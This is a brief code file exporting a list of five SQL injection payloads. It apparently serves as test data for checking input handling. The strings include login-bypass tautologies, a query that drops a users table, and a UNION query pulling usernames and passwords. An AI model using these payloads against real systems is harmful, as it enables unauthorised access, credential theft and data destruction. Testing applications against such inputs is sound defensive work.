export const sqliPayloads = [
  "' OR '1'='1",
  "1; DROP TABLE users--",
  "1' UNION SELECT null,username,password FROM users--",
  "admin'--",
  "' OR 1=1 LIMIT 1--",
];
